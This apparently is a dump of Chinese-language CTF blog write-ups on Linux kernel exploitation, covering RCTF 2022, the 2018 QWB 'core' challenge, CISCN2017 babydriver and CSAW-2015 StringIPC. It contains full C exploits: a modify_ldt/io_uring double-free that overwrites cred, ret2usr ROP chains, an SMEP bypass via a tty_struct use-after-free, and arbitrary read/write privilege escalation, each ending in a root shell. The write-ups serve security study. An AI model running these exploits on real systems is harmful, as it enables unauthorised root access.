memset(buf, 0, sizeof(buf));    ioctl(fd, 0, buf);    ioctl(fd, 0x72, &quot;flag=aaaaaaaaa&quot;); // context-&gt;cur[0] = object(0x10);    read(fd, buf, 8);    uint64_t heap_addr = *(uint64_t *)buf;    printf(&quot;\\033[32m\\033[1m[+] heap_addr : \\033[0m %p\\n&quot;, heap_addr);    ioctl(fd, 1, buf);                 // context-&gt;prv[0] = object(0x10);    ioctl(fd, 0x72, &quot;flag=bbbbbbbbb&quot;); // kfree(context-&gt;cur[0]);    struct user_desc desc;    desc.base_addr = 0xff0000;    desc.entry_number = 0x1000 / 8;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc)); // context-&gt;prev[0] = object(0x10) == ldt_struct;    ioctl(fd, 0x16, buf); // double free     kfree(object(ldt_struct));    puts(&quot;\\n\\033[34m\\033[1m[*] search cred!\\033[0m&quot;);    register_tag(&amp;ring, buf, 2);    search_addr = heap_addr &amp; 0xfffffffffffff000;    pipe(pipe_fd);    struct ldt_struct ldt;    unsigned long long int i = 0;    while (1)    &#123;        memset(buf, 0, 0x1000);        ldt.entries = search_addr - i * 0x1000;        ldt.nr_entries = 0x1000 / 8;        update_tag(&amp;ring, &amp;ldt, 2);        if (i &amp;&amp; i % 0x200 == 0)        &#123;            printf(&quot;\\033[34m\\033[1m[*] looked up range from \\033[0m %p ~ %p\\n&quot;, search_addr - i * 0x1000, search_addr + i * 0x1000);        &#125;        if (!fork())        &#123;            int res = syscall(SYS_modify_ldt, 0, buf, 0x1000);            if (res != 0x1000)            &#123;                errExit(&quot;read_ldt failed!&quot;);            &#125;            result = memmem(buf, 0x1000, target, 0x10);            if (result)            &#123;                cred = *(size_t *)(result - 0x10);                real_cred = *(size_t *)(result - 0x18);                if ((real_cred &amp; 0xff00000000000000) &amp;&amp; (real_cred == cred))                &#123;                    target_addr = search_addr - (i * 0x1000) + (result - buf);                    printf(&quot;\\033[32m\\033[1m[+] found task_struct : \\033[0m %p\\n&quot;, target_addr);                    printf(&quot;\\033[32m\\033[1m[+] found cred : \\033[0m %p\\n&quot;, real_cred);                &#125;                else                &#123;                    real_cred = -1;                    printf(&quot;\\033[31m\\033[1m[-]\\033[0m cannot rehint cred\\n&quot;);                &#125;            &#125;            write(pipe_fd[1], &amp;real_cred, 8);            exit(0);        &#125;        wait(NULL);        read(pipe_fd[0], &amp;real_cred, 8);        if (real_cred != -1)        &#123;            break;        &#125;        if (i == 0)        &#123;            i++;            continue;        &#125;        memset(buf, 0, 0x1000);        ldt.entries = search_addr + i * 0x1000;        ldt.nr_entries = 0x1000 / 8;        update_tag(&amp;ring, &amp;ldt, 2);        if (!fork())        &#123;            int res = syscall(SYS_modify_ldt, 0, buf, 0x1000);            if (res != 0x1000)            &#123;                errExit(&quot;read_ldt failed!&quot;);            &#125;            result = memmem(buf, 0x1000, target, 0x10);            if (result)            &#123;                cred = *(size_t *)(result - 0x10);                real_cred = *(size_t *)(result - 0x18);                if ((real_cred &amp; 0xff00000000000000) &amp;&amp; (real_cred == cred))                &#123;                    target_addr = search_addr + (i * 0x1000) + (result - buf);                    printf(&quot;\\033[32m\\033[1m[+] found task_struct : \\033[0m %p\\n&quot;, target_addr);                    printf(&quot;\\033[32m\\033[1m[+] found cred : \\033[0m %p\\n&quot;, real_cred);                &#125;                else                &#123;                    real_cred = -1;                    printf(&quot;\\033[31m\\033[1m[-]\\033[0m cannot rehint cred\\n&quot;);                &#125;            &#125;            write(pipe_fd[1], &amp;real_cred, 8);            exit(0);        &#125;        wait(NULL);        read(pipe_fd[0], &amp;real_cred, 8);        if (real_cred != -1)        &#123;            break;        &#125;        i++;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] write cred!\\033[0m&quot;);    desc.base_addr = 0xff1000;    desc.entry_number = 0x1000 / 4;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc));    memset(buf, 0, 0x1000);    register_tag(&amp;ring1, buf, (0x1000 / 8) + 1);    for (int i = 0; i &lt;= 5; i++)    &#123;        *(uint64_t *)buf = real_cred + 4 + 8 * i;        update_tag(&amp;ring, buf, 1);        *(uint64_t *)buf = 0;        read(fd, info, 9);        update_tag(&amp;ring1, buf, 1);    &#125;    *(uint64_t *)buf = search_addr + 0x3000000;    update_tag(&amp;ring, buf, 1);    puts(&quot;\\033[32m\\033[1m[+] write Done \\033[0m&quot;);    get_shell();    return 0;&#125;\n\n\n\n参考链接:\n​    https://blog.rois.io/2022/rctf-2022-official-write-up/\n​    https://elixir.bootlin.com/linux/v6.0.12/source\n​    https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896\n题目链接:\n​    XCTF中可以下载\n","categories":["kernel-pwn"],"tags":["modify_ldt","io_uring"]},{"title":"kernel pwn基础[1]","url":"/2022/03/22/kernel-pwn%E5%9F%BA%E7%A1%80-1/","content":"这里的例题仍然是上一篇的两个例题，不过使用不同的解法。\n2018 强网杯 - core上一篇里这道题使用的方法是ROP，不过这一方法相对来说比较麻烦，构造ROP链挺恼火的。\n\n可以看到并没有打开smep所以可以直接实现ret2usr。\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;size_t raw_vmlinux_base = 0xffffffff81000000;size_t commit_creds = 0, prepare_kernel_cred = 0, vmlinux_base = 0;void find_symbols()&#123;    FILE *file = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (file &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while (fgets(buf, 0x30, file))    &#123;        if (commit_creds &amp; prepare_kernel_cred)            return;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if (!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;void get_root()&#123;    char *(*pkc)(int) = prepare_kernel_cred;    void (*cc)(char *) = commit_creds;    (*cc)((*pkc)(0));&#125;void get_shell()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    ioctl(fd, 0x6677889C, 0x40);    char buf[0x30] = &#123;0&#125;;    ioctl(fd, 0x6677889B, buf);    size_t canary = ((size_t *)buf)[0];    size_t payload[0x1000] = &#123;0&#125;;    int i;    for (i = 0; i &lt; 10; i++)    &#123;        payload[i] = canary;    &#125;    payload[i++] = (size_t)get_root;    payload[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;    payload[i++] = (size_t)get_shell;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    write(fd, payload, 0x800);    ioctl(fd, 0x6677889A, 0xffffffffffff0100);&#125;\n\n可以看到这里的payload少了很多\nCISCN2017 - babydriver首先不是用之前的方法需要一定的前置知识\nsmep为了防止 ret2usr 攻击，内核开发者提出了 smep 保护，smep 全称 Supervisor Mode Execution Protection，是内核的一种保护措施，作用是当 CPU 处于 ring0 模式时，执行 用户空间的代码 会触发页错误；这个保护在 arm 中被称为 PXN。\n\n可以看到这里是打开了smep保护的。\n系统其实是根据CR4寄存器来判断是否开启smep保护，当smep位为1代表开启，反之就是关闭。所以我们只需要可以控制这里值的gadget即可。一般是采用固定的值放入CR4寄存器mov cr4, 0x6f0\n解题思路这里不使用第一种方式的话，思路大概就是先关闭smep保护，然后ret2usr。\n首先是通过UAF控制一个tty_struct结构：\nstruct tty_struct &#123;    int magic;    struct kref kref;    struct device *dev;    struct tty_driver *driver;    const struct tty_operations *ops;    int index;    /* Protects ldisc changes: Lock tty not pty */    struct ld_semaphore ldisc_sem;    struct tty_ldisc *ldisc;    struct mutex atomic_write_lock;    struct mutex legacy_mutex;    struct mutex throttle_mutex;    struct rw_semaphore termios_rwsem;    struct mutex winsize_mutex;    spinlock_t ctrl_lock;    spinlock_t flow_lock;    /* Termios values are protected by the termios rwsem */    struct ktermios termios, termios_locked;    struct termiox *termiox;    /* May be NULL for unsupported */    char name[64];    struct pid *pgrp;       /* Protected by ctrl lock */    struct pid *session;    unsigned long flags;    int count;    struct winsize winsize;     /* winsize_mutex */    unsigned long stopped:1,    /* flow_lock */              flow_stopped:1,              unused:BITS_PER_LONG - 2;    int hw_stopped;    unsigned long ctrl_status:8,    /* ctrl_lock */              packet:1,              unused_ctrl:BITS_PER_LONG - 9;    unsigned int receive_room;  /* Bytes free for queue */    int flow_change;    struct tty_struct *link;    struct fasync_struct *fasync;    wait_queue_head_t write_wait;    wait_queue_head_t read_wait;    struct work_struct hangup_work;    void *disc_data;    void *driver_data;    spinlock_t files_lock;      /* protects tty_files list */    struct list_head tty_files;#define N_TTY_BUF_SIZE 4096    int closing;    unsigned char *write_buf;    int write_cnt;    /* If the tty has a pending do_SAK, queue it here - akpm */    struct work_struct SAK_work;    struct tty_port *port;&#125; __randomize_layout;\n\n在这个结构体的有另一个结构体const struct tty_operations *ops;：\nstruct tty_operations &#123;    struct tty_struct * (*lookup)(struct tty_driver *driver,            struct file *filp, int idx);    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);    int  (*open)(struct tty_struct * tty, struct file * filp);    void (*close)(struct tty_struct * tty, struct file * filp);    void (*shutdown)(struct tty_struct *tty);    void (*cleanup)(struct tty_struct *tty);    int  (*write)(struct tty_struct * tty,              const unsigned char *buf, int count);    int  (*put_char)(struct tty_struct *tty, unsigned char ch);    void (*flush_chars)(struct tty_struct *tty);    int  (*write_room)(struct tty_struct *tty);    int  (*chars_in_buffer)(struct tty_struct *tty);    int  (*ioctl)(struct tty_struct *tty,            unsigned int cmd, unsigned long arg);    long (*compat_ioctl)(struct tty_struct *tty,                 unsigned int cmd, unsigned long arg);    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);    void (*throttle)(struct tty_struct * tty);    void (*unthrottle)(struct tty_struct * tty);    void (*stop)(struct tty_struct *tty);    void (*start)(struct tty_struct *tty);    void (*hangup)(struct tty_struct *tty);    int (*break_ctl)(struct tty_struct *tty, int state);    void (*flush_buffer)(struct tty_struct *tty);    void (*set_ldisc)(struct tty_struct *tty);    void (*wait_until_sent)(struct tty_struct *tty, int timeout);    void (*send_xchar)(struct tty_struct *tty, char ch);    int (*tiocmget)(struct tty_struct *tty);    int (*tiocmset)(struct tty_struct *tty,            unsigned int set, unsigned int clear);    int (*resize)(struct tty_struct *tty, struct winsize *ws);    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);    int (*get_icount)(struct tty_struct *tty,                struct serial_icounter_struct *icount);    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);#ifdef CONFIG_CONSOLE_POLL    int (*poll_init)(struct tty_driver *driver, int line, char *options);    int (*poll_get_char)(struct tty_driver *driver, int line);    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);#endif    int (*proc_show)(struct seq_file *, void *);&#125; __randomize_layout;\n\n可以看到这里面存在许多的函数地址指针，有之前堆的基础的就可以想到这是类似与控制vtable然后伪造函数指针来劫持程序执行流。\n不过不同的是，我们在堆中使用的是one_gadget，但是这里我们是把获得root的payload放在栈上，但是内核态的sp并不指向我们存放的payload的地址，所以动态调试看一下如何解决。\nsize_t fake_tty_operations[30] = &#123;    0xffffffff810d238d, // pop rdi; ret;    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d&#125;;int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);ioctl(fd1, 0x10001, 0x2e0); // 0x2e0是tty_struct结构体的sizeclose(fd1);int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);size_t fake_tty_struct[4] = &#123;0&#125;;read(fd2, fake_tty_struct, 32);fake_tty_struct[3] = (size_t)fake_tty_operations;write(fd2, fake_tty_struct, 32);char buf[8] = &#123;0&#125;;write(fd_tty, buf, 8);\n\n\n\n可以看到在执行到我们构造的加指针位置时的rax是指向我们构造的fake_tty_operations结构体。\n然后就是寻在gadget，不过实现rsp的转移，这里找gadget不能直接在ropper出来的内容里找，因为这不是常规的gadget所以里面不存在\ntcdy@arch-linux ~/Downloads/study_kernel % objdump -d vmlinux &gt; gadget2.txt\n\n\n\n这是两句拼接在一起的gadget，不过依旧可以正常使用。接着就是做ret2usr即可\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#define prepare_kernel_cred_addr 0xffffffff810a1810#define commit_creds_addr 0xffffffff810a1420size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;void get_root()&#123;    char *(*pkc)(int) = prepare_kernel_cred_addr;    void (*cc)(char *) = commit_creds_addr;    (*cc)((*pkc)(0));&#125;int main()&#123;    save_status();    size_t payload[32] = &#123;0&#125;;    int i = 0;    payload[i++] = 0xffffffff810d238d; // pop rdi; ret;    payload[i++] = 0x6f0;    payload[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;    payload[i++] = 0;    payload[i++] = (size_t)get_root;    payload[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff814e35ef; // iretq; ret;    payload[i++] = (size_t)get_shell;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    size_t pop_rax = 0xffffffff8100ce6e;    size_t mov_rsp_rax = 0xffffffff8181bfc5;    size_t fake_tty_operations[30] = &#123;        pop_rax,        (size_t)payload,        mov_rsp_rax,        0,        0,        0,        0,        mov_rsp_rax, // write point        0,        0,        0,        0,        0,    &#125;;    int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);    int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);    ioctl(fd1, 0x10001, 0x2e0); // 0x2e0是tty_struct结构体的size    close(fd1);    int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);    size_t fake_tty_struct[4] = &#123;0&#125;;    read(fd2, fake_tty_struct, 32);    fake_tty_struct[3] = (size_t)fake_tty_operations;    write(fd2, fake_tty_struct, 32);    char buf[8] = &#123;0&#125;;    write(fd_tty, buf, 8);&#125;\n\n","categories":["kernel-pwn"],"tags":["ret2usr","bypass semp"]},{"title":"kernel pwn内存任意读写提升权限[1]","url":"/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/","content":"前言分析通过内存任意读写到提升权限的三种方式\n在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过commit_creds(prepare_kernel_cred(0));以及第一篇提到的直接修改cred结构体，所以这里将入门的其余几条提权方式记录一下\n本文使用题目：https://github.com/196082/196082\n例题分析CSAW-2015-StringIPC\nqemu-system-x86_64 \\-m 512M \\-kernel ./bzImage \\-initrd  ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \\-cpu qemu64,+smep,+smap \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic  -enable-kvm  \\-s\n\n首先了开启了smep和smap保护，没有开启kaslr\ncat /proc/kallsyms &gt; /tmp/kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrict\n\ninit脚本没什么好说的，这里将符号表放到了tmp内\n下面来看驱动的代码：\ncase 0x77617364u:    if ( copy_from_user(&amp;write_channel, v3, 0x10LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -16LL;    mutex_lock(&amp;private_data-&gt;lock);    if ( !private_data-&gt;channel )    &#123;        count = alloc_new_ipc_channel(*&amp;write_channel.id, &amp;channel);// 根据write_channel.id的值申请相应大小的堆块        if ( count &gt;= 0 )        &#123;            private_data-&gt;channel = channel;            LODWORD(write_channel.buf) = channel-&gt;id;// 返回堆块相应的idx            if ( copy_to_user(v5, &amp;write_channel, 0x10LL) )            &#123;                count = -22LL;                close_ipc_channel(private_data, channel-&gt;id);            &#125;        &#125;    &#125;    goto LABEL_9;case 0x77617365u:    if ( copy_from_user(&amp;write_channel, v3, 4LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -16LL;    mutex_lock(&amp;private_data-&gt;lock);    if ( private_data-&gt;channel )        goto LABEL_9;    channel_by_id = get_channel_by_id(write_channel.id, v5);// 可以看到是根据idx获取channel    count = channel_by_id;    if ( channel_by_id &gt; 0xFFFFFFFFFFFFF000LL )        goto LABEL_9;    private_data-&gt;channel = channel_by_id;    if ( !_InterlockedSub(&amp;channel_by_id-&gt;ref.refcount.counter, 1u) )        ipc_channel_destroy(&amp;channel_by_id-&gt;ref);// 释放channel    count = 0LL;    mutex_unlock(&amp;private_data-&gt;lock);    return count;\n\ncase 0x77617366u:    if ( copy_from_user(&amp;write_channel, v3, 16LL) )        return -22LL;    v11 = &amp;private_data-&gt;lock;    mutex_lock(v11);    v13 = 1LL;    goto LABEL_24;case 0x77617367u:    if ( copy_from_user(&amp;write_channel, v3, 16LL) )        return -22LL;    v11 = &amp;private_data-&gt;lock;    mutex_lock(v11);    v13 = 0LL;LABEL_24:    count = realloc_ipc_channel(write_channel.id, write_channel.buf, v13, v12);    mutex_unlock(v11);    return count;\n\n可以看到这里会进入到realloc_ipc_channel\nunsigned __int64 __fastcall realloc_ipc_channel(ipc_state *state, __int64 id, size_t size, int grow)&#123;    int v4; // edx    int v5; // r13d    unsigned __int64 result; // rax    unsigned __int64 v7; // rbx    __int64 v8; // r12    __int64 v9; // rax    _fentry__(state, id);    v5 = v4;    result = get_channel_by_id(state, id);// 根据idx获取channel    v7 = result;    if ( result &lt;= 0xFFFFFFFFFFFFF000LL )    &#123;        if ( v5 )// 变大还是变小            v8 = *(result + 16) + id;        else            v8 = *(result + 16) - id;        v9 = krealloc(*(result + 8), v8 + 1, 37748928LL);        if ( v9 )        &#123;            *(v7 + 8) = v9;            *(v7 + 16) = v8;            if ( _InterlockedSub(v7, 1u) )            &#123;                return 0LL;            &#125;            else            &#123;                ipc_channel_destroy(v7);                return 0LL;            &#125;        &#125;        else        &#123;            return 4294967274LL;        &#125;    &#125;    return result;&#125;\n\n当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址\nmm\\slab_common.c:/** * krealloc - reallocate memory. The contents will remain unchanged. * @p: object to reallocate memory for. * @new_size: how many bytes of memory are required. * @flags: the type of memory to allocate. * * The contents of the object pointed to are preserved up to the * lesser of the new and old sizes.  If @p is %NULL, krealloc() * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a * %NULL pointer, the object pointed to is freed. */void *krealloc(const void *p, size_t new_size, gfp_t flags)&#123;\tvoid *ret;\tif (unlikely(!new_size)) &#123;\t\tkfree(p);\t\treturn ZERO_SIZE_PTR;\t&#125;\tret = __do_krealloc(p, new_size, flags);\tif (ret &amp;&amp; p != ret)\t\tkfree(p);\treturn ret;&#125;EXPORT_SYMBOL(krealloc);include\\linux\\slab.h:#define ZERO_SIZE_PTR ((void *)16)\n\n所以我们可以构造new_size为0即可返回0x10，并且我们构造为0是让记录size的位置为-1\ncase 0x77617368u:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    mutex_lock(&amp;private_data-&gt;lock);    v14 = private_data-&gt;channel;    count = write_channel.count;    if ( !private_data-&gt;channel )        goto LABEL_40;    index = v14-&gt;index;    if ( write_channel.count + index &gt; v14-&gt;buf_size        || copy_to_user(write_channel.buf, &amp;v14-&gt;data[index], LODWORD(write_channel.count)) )    &#123;        goto LABEL_31;    &#125;    goto LABEL_9;case 0x77617369u:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    mutex_lock(&amp;private_data-&gt;lock);    v16 = private_data-&gt;channel;    count = write_channel.count;    if ( !private_data-&gt;channel )    &#123;        LABEL_40:        count = -6LL;        goto LABEL_9;    &#125;    v17 = v16-&gt;index;    if ( write_channel.count + v17 &gt; v16-&gt;buf_size        || strncpy_from_user(&amp;v16-&gt;data[v17], write_channel.buf, write_channel.count) &lt; 0 )    &#123;        goto LABEL_31;    &#125;    goto LABEL_9;case 0x7761736Au:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -6LL;    mutex_lock(&amp;private_data-&gt;lock);    v8 = private_data-&gt;channel;    if ( !private_data-&gt;channel )        goto LABEL_9;    if ( LODWORD(write_channel.count) )    &#123;        if ( LODWORD(write_channel.count) == 1 )        &#123;            count = v8-&gt;index;            goto LABEL_9;        &#125;        goto LABEL_31;    &#125;    count = (__int64)write_channel.buf;    if ( (char *)v8-&gt;buf_size &lt;= write_channel.buf )    &#123;        LABEL_31:        count = -22LL;        goto LABEL_9;    &#125;    v8-&gt;index = (loff_t)write_channel.buf;    LABEL_9:    mutex_unlock(p_lock);    return count;\n\n下面则是根据修改index，然后根据index读取或者写入内容。\n.text:0000000000000652 48 8B 5D C8                   mov     rbx, [rbp-38h].text:0000000000000656 48 39 58 10                   cmp     [rax+10h], rbx.text:000000000000065A 76 85                         jbe     short loc_5E1\n\n并且可以看到下面是无符号比较，所以我们刚刚写入的-1就会变成最大的值，也就造成了任意地址读写了。\n修改cred结构提升权限cred结构体应该不会很陌生，所以我们的思路就是修改cred结构体中记录进程权限的值即可\n首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息\nstruct thread_info &#123;\tstruct task_struct\t*task;\t\t/* main task structure */\t__u32\t\t\tflags;\t\t/* low level flags */\t__u32\t\t\tstatus;\t\t/* thread synchronous flags */\t__u32\t\t\tcpu;\t\t/* current CPU */\tmm_segment_t\t\taddr_limit;\tunsigned int\t\tsig_on_uaccess_error:1;\tunsigned int\t\tuaccess_err:1;\t/* uaccess failed */&#125;;\n\nthread_info结构体存放在线程栈中最低的地址，并且包含一个重要信息task_struct\nstruct task_struct &#123;\tvolatile long state;\t/* -1 unrunnable, 0 runnable, &gt;0 stopped */\tvoid *stack;\tatomic_t usage;\tunsigned int flags;\t/* per process flags, defined below */\tunsigned int ptrace;\t... ...\t/* process credentials */\tconst struct cred __rcu *ptracer_cred; /* Tracer&#x27;s credentials at attach */\tconst struct cred __rcu *real_cred; /* objective and real subjective task\t\t\t\t\t * credentials (COW) */\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\t\t\t\t\t * credentials (COW) */\tchar comm[TASK_COMM_LEN]; /* executable name excluding path\t\t\t\t     - access with [gs]et_task_comm (which lock\t\t\t\t       it with task_lock())\t\t\t\t     - initialized normally by setup_new_exec */\t/* file system info */\tstruct nameidata *nameidata;\t    #ifdef CONFIG_SYSVIPC    /* ipc stuff */        struct sysv_sem sysvsem;        struct sysv_shm sysvshm;    #endif    ... ... &#125;;\n\n可以看到其中存放着cred结构体，这里就不再提cred结构体了\nstruct cred *prepare_creds(void)&#123;\tstruct task_struct *task = current;\tconst struct cred *old;\tstruct cred *new;\tvalidate_process_creds();\tnew = kmem_cache_alloc(cred_jar, GFP_KERNEL);\tif (!new)\t\treturn NULL;\tkdebug(&quot;prepare_creds() alloc %p&quot;, new);\told = task-&gt;cred;\tmemcpy(new, old, sizeof(struct cred));\tatomic_set(&amp;new-&gt;usage, 1);\tset_cred_subscribers(new, 0);\tget_group_info(new-&gt;group_info);\tget_uid(new-&gt;user);\tget_user_ns(new-&gt;user_ns);#ifdef CONFIG_KEYS\tkey_get(new-&gt;session_keyring);\tkey_get(new-&gt;process_keyring);\tkey_get(new-&gt;thread_keyring);\tkey_get(new-&gt;request_key_auth);#endif#ifdef CONFIG_SECURITY\tnew-&gt;security = NULL;#endif\tif (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)\t\tgoto error;\tvalidate_creds(new);\treturn new;error:\tabort_creds(new);\treturn NULL;&#125;EXPORT_SYMBOL(prepare_creds);\n\n可以看到cred结构体是通过kmem_cache_alloc创建的\n利用方式利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权\n如何找到这个结构体?在task_struct里有一个 char comm[TASK_COMM_LEN]; 字符数组，这个字符串表示线程的名字，其内容可以通过linux的prctl(PR_SET_NAME,target);来设置指定的值。那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，在内存里搜索这个标记，如果搜索到了，就可以确定这个位置前面就是cred指针\nlinux kernel内存映射图：\n0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+                       |           |                                               |+++++++++++++|    8M                 |           | unused hole                                   |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|    1M                 |           |                                               |+++++++++++++|0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|    548K               |           | vsyscalls                                     |+++++++++++++|0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|    5M                 |           | hole                                          |+++++++++++++|0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|                       |           |                                               |+++++++++++++|    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|                       |           |                                               |+++++++++++++|    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|    2G                 |           | hole                                          |+++++++++++++|0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|    64G                |           | EFI region mapping space                      |+++++++++++++|0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|    444G               |           | hole                                          |+++++++++++++|0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    16T                |           | %esp fixup stacks                             |+++++++++++++|0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    3T                 |           | hole                                          |+++++++++++++|0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|                       